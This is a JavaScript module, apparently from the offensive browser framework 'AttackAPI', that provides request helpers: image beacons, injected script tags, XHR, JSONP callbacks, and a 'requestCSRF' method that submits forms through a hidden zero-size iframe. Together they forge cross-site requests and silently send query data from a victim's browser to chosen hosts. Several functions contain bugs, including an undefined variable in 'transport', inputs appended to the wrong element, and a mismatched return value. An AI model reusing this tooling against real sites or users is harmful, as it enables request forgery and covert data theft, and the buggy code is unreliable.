
/**
 * @name AttackAPI.Util['::DOM::Requester']
 * @desc DOM request features
 * @extend AttackAPI.Util['::DOM']
 */
AttackAPI.Util['::DOM::Requester'] = AttackAPI.Util['::DOM'].extend({
	/**
	 * @name AttackAPI.Util['::DOM::Requester'].prototype.initialize
	 * @desc initialize new DOM requester object
	 */
	initialize: function () {
		this.queryP = new AttackAPI.Parser['::Query'];
		arguments.callee.$.initialize.apply(this, arguments);
	},
	/**
	 * @name AttackAPI.Util['::DOM::Requester'].prototype.transport
	 * @desc tarsport data to the targeted resource
	 * @param Object t the transport object
	 */
	transport: function (t) {
		var u = r.url + '?' + this.queryP.build(r.query);
		
		if (u.length <= 2048)
			return this.requestL(u);
		else
			return this.requestCSRF(this.extend(r, {method: 'POST'}));
	},
	/**
	 * @name AttackAPI.Util['::DOM::Requester'].prototype.request
	 * @desc perform request using the Image object
	 * @param Object r the request object
	 */
	request: function (r) {
		var t = null;
		
		var i = new Image();
		i.onload = i.onerror = function () {
			window.clearTimeout(t);
			
			if (typeof(r.onload) == 'function')
				r.onload({}, r);
		};
		
		if (r.query)
			i.src = r.url + '?' + this.queryP.build(r.query);
		else
			i.src = r.url;
			
		t = window.setTimeout(function () {
			delete i;
			
			if (typeof(r.ontimeout) == 'function')
				r.ontimeout(r);
		}, r.timeout?r.timeout:1000);
	},
	/**
	 * @name AttackAPI.Util['::DOM::Requester'].prototype.requestL
	 * @desc lite implementation of AttackAPI.Util.prototype.request
	 * @param String u the url to request
	 */
	requestL: function (u) {
		var i = new Image();
		i.src = u;
	},
	/**
	 * @name AttackAPI.Util['::DOM::Requester'].prototype.requestJS
	 * @desc perform request using the a script tag object
	 * @param Object r the request object
	 */
	requestJS: function (r) {
		var t = null;
		
		var s = document.createElement('script');
		s.type = 'text/javascript';
		s.onload = function () {
			window.clearTimeout(t);
			
			if (typeof(r.onload) == 'function')
				r.onload({}, r);
		};
		s.onerror = function () {
			window.clearTimeout(t);
			
			if (typeof(t.onerror) == 'function')
				t.onerror('error', request);
		};
		
		if (r.query)
			s.src = r.url + '?' + this.queryP.build(r.query);
		else
			s.src = r.url;
			
		document.body.appendChild(s);
		
		t = window.setTimeout(function () {
			if (typeof(r.ontimeout) == 'function')
				r.ontimeout(r);
		}, r.timeout?r.timeout:1000);
	},
	/**
	 * @name AttackAPI.Util['::DOM::Requester'].prototype.requestJSL
	 * @desc lite implementation of AttackAPI.Util.prototype.requestJS
	 * @param String url the url to request
	 */
	requestJSL: function (url) {
		var s = document.createElement('script');
		s.type = 'text/javascript';
		s.src = url;
		
		document.body.appendChild(s);
	},
	/**
	 * @name AttackAPI.Util['::DOM::Requester'].prototype.requestXHR
	 * @desc perform request using the XMlHttpRequest object
	 * @param Object r the request object
	 */
	requestXHR: function (r) {
		try {
			var x = this.getXHR();
		} catch (e) {
			if (typeof(r.onerror) == 'function')
				r.onerror(e, r);
				
				return;
		}
		
		var t = window.setTimeout(function () {
			x.abort();
			
			if (typeof(r.ontimeout) == 'function')
				r.ontimeout(r);
		}, r.timeout?r.timeout:10000);
		
		x.onreadystatechange = function () {
			if (x.readyState == 4) {
				window.clearTimeout(t);
				
				if (typeof(r.onload) == 'function')
					r.onload({status: x.status, data: x.responseText, dataXML: x.responseXML, headers: x.getAllResponseHeaders()}, x);
			}
		};
		
		try {
			var m = r.method?r.method:'GET';
			var u = r.url + (m == 'GET' && r.query?'?' + this.queryP.build(r.query):'');
			
			x.open(m, u);
			
			if (r.headers)
				for (var h in r.headers)
					x.setRequestHeader(h, r.headers[h]);
					
			x.send(r.body?r.body:(m != 'GET' && r.query?this.queryP.build(r.query):null));
		} catch (e) {
			if (typeof(r.onerror) == 'function')
				r.onerror(e, r);
				
			return;
		}
	},
	/**
	 * @name AttackAPI.Util['::DOM::Requester'].prototype.requestCSRF
	 * @desc perform request using hiden IFRAME with anonymous form
	 * @param Object r the request object
	 */
	requestCSRF: function (r) {
		var t = null;
		
		var i = document.createElement('iframe');
		i.style.visibility = 'hidden';
		i.style.width = i.style.height = 0;
		
		document.body.appendChild(i);
		
		try {
			var d = this.getDoc(i);
		} catch (e) {
			if (typeof(r.onerror) == 'function')
				r.onerror(e, r);
				
			return;
		}
		
		var f = document.createElement('form');
		f.setAttribute('method', r.method?r.method:'GET');
		f.setAttribute('action', r.url);
		
		for (var n in r.query) {
			var _i = document.createElement('input');
			_i.setAttribute('name', n);
			_i.setAttribute('value', r.query[n]);
			_i.setAttribute('type', 'text');
			
			r.appendChild(_i);
		}
		
		d.body.appendChild(f);
	
		i.onload = function () {
			window.clearTimeout(t);
			
			var d = null;
			
			try {
				data = this.getDoc(i).body.innerHTML;
			} catch (e) {}
			
			i.src = '';
			document.body.removeChild(i);
			
			if (typeof(r.onload) == 'function')
				r.onload({data: d}, r);
		};
		
		t = window.setTimeout(function () {
			document.body.removeChild(i);
			
			if (typeof(r.ontimeout) == 'function')
				r.ontimeout(r);
		}, r.timeout?r.timeout:10000);
		
		f.submit();
	},
	/**
	 * @name AttackAPI.Util['::DOM::Requester'].prototype.requestJSON
	 * @desc perform request using JSON
	 * @param Object r the request object
	 */
	requestJSON: function (r) {
		var n = '__callback' + new Date().getTime();
		
		window[n] = function () {
			if (typeof(r.oncallback) == 'function')
				r.oncallback.apply(r, arguments);
		};
		
		var q = r.query?r.query:{};
		q[r.callback?r.callback:'callback'] = n;
		
		this.requestJSL(r.url + '?' + this.queryP.build(q));
	}
});